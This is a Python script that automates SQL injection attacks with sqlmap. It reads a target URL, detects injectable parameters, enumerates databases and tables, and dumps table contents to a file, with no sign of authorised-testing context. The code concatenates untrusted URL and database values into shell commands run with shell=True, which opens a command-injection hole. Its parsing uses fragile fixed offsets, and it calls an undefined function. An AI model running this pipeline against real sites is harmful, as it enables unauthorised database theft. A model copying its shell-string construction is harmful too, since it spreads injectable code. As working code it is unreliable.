import subprocess
import query

def scan_url_vulnerability(url):
	query = "sqlmap -u "+ url +" --batch"
	vuls=[]

	# f = open("output.txt", "w")
	# f.write("query:" + query)
	# f.write("\n")
	# f.close()

	print(query)
	print("scanning vulnerability")
	process = subprocess.Popen([query],
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE, 
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()

	for x in range(len(stdout)):
		if (stdout[x:(x+8)])== "starting":
			time_starting = stdout[(x+11):(x+19)]
			f = open("output.txt", "w")
			f.write("time_starting:" + time_starting)
			f.write("\n")
			f.close()
			# print("time starting = " + time_starting)
		if (stdout[x:(x+4)]) == "Type":
			if stdout[x+6] == "b":
				vuls.append("B")
			elif stdout[x+6] == "s":
				vuls.append("S")
			elif stdout[x+6] == "t":
				vuls.append("T")
			else:
				vuls.append(stdout[x+6])
	f = open("output.txt", "a")
	for vul in vuls:
		f.write("vul:" + vul)
		f.write("\n")
	f.close()
	
	return vuls		


def scan_url_database(url, tech, level):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " --dbs" + " --batch"
	dbs = []

	print(query)
	print("scanning databases")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	

	for x in range(len(stdout)):
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		

			if(len(dbs) == 0):
				f = open("output.txt", "a")
				f.write("dbs:null")
				f.write("\n")
				f.close()
			else:
				f = open("output.txt", "a")
				for db in dbs:
					f.write("dbs:" + db)
					f.write("\n")
				f.close()		


	return dbs

def scan_url_tables(url, tech, level, db):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " --tables" + " --batch"
	tables = []

	print(query)
	print("scanning tables")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()


	for x in range(len(stdout)):
		str_search = "Database: " + db
		if stdout[x:(x+10+len(db))] == str_search:
			tables.append(stdout[(x+36+len(db)):(x+43+len(db))])
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			# print("time ending = " + time_ending)

	f = open("output.txt", "a")
	for table in tables:
		f.write("table:" + table)
		f.write("\n")
	f.close()

	f = open("output.txt", "a")
	f.write("time_ending:" + time_ending)
	f.write("\n")
	f.close()

	return tables

def scan_url_content(url, tech, level, db, table):
	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " -T " + table + " --dump" +" --batch"


	print(query)
	print("scanning content")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()

	f = open("output_test.txt", "w")
	f.write(stdout)
	f.close()





def scan_query_vulnerability(query):
	vuls = []
	f = open("output.txt", "w")
	f.write("query:" + query)
	f.write("\n")
	f.close()

	
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout, stderr = process.communicate()
	
	for x in range(len(stdout)):
		if (stdout[x:(x+8)])== "starting":
			time_starting = stdout[(x+11):(x+19)]
			f = open("output.txt", "a")
			f.write("time_starting:" + time_starting)
			f.write("\n")
			f.close()
			# print("time starting = " + time_starting)
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			f = open("output.txt", "a")
			f.write("time_ending:" + time_ending)
			f.write("\n")
			f.close()
			# print("time ending = " + time_ending)
		if (stdout[x:(x+4)]) == "Type":
			vul = stdout[x+6]
			f = open("output.txt", "a")
			f.write("vul:" + vul)
			f.write("\n")
			f.close()
			vuls.append(stdout[x+6])
	print("test")
	return vuls	

def scan_query_database(query):
	dbs = []

	print(query)
	print("scanning database")
	process = subprocess.Popen([query], 
						stdin=subprocess.PIPE,
						stdout=subprocess.PIPE,
						stderr=subprocess.PIPE,
						shell = True, text = True)
	stdout,stderr = process.communicate()
	

	for x in range(len(stdout)):
		if(stdout[x:(x+19)]) == "available databases":
			quantity_dbs = int(stdout[x+21])
			if(quantity_dbs == 1):
				for i in range((x+25), len(stdout), 1):
					if(stdout[i] == "\n"):
						dbs.append(stdout[(x+29):i])
						break
			else:
				getdb = 0
				i = x+19
				while(getdb < quantity_dbs):
					if(stdout[i] == "\n"):
						for j in range((i+6), len(stdout), 1):
							if(stdout[j] == "\n"):
								dbs.append(stdout[(i+5):j])
								break
						getdb += 1
						i += 1
					else:
						i += 1		

			if(len(dbs) == 0):
				f = open("output.txt", "a")
				f.write("dbs:null")
				f.write("\n")
				f.close()
			else:
				f = open("output.txt", "a")
				for db in dbs:
					f.write("dbs:" + db)
					f.write("\n")
				f.close()		
		if (stdout[x:(x+6)]) == "ending":
			time_ending = stdout[(x+9):(x+17)]
			f = open("output.txt", "a")
			f.write("time_ending:" + time_ending)
			f.write("\n")
			f.close()
			# print("time ending = " + time_ending)

	return dbs


def main():
	mode =1
	tech = ["B", "E", "U", "S", "T", "Q"]
	level = ["2", "3", "4", "5"]
	if(mode == 1):
		f = open("input.txt", "r")
		url =  f.read()
		f.close()


		vuls = scan_url_vulnerability(url)
		if len(vuls) == 0:
			print("website have not vulnerability sql injection")
		else:
			dbs = scan_url_database(url, vuls[0], level[0])
		if len(dbs) == 0:
			print("we can not scan databases")
		else:
			tables = scan_url_tables(url, vuls[0], level[0], dbs[0])
		if len(tables) == 0:
			print("we can not scan tables")
		else:
			scan_url_content(url, vuls[0],level[0], dbs[0], tables[0])

	if(mode == 2):
		print("scan with query")
	if(mode == 3):
		db = "public"
		get_url_table(db)

if __name__ == "__main__":
	main()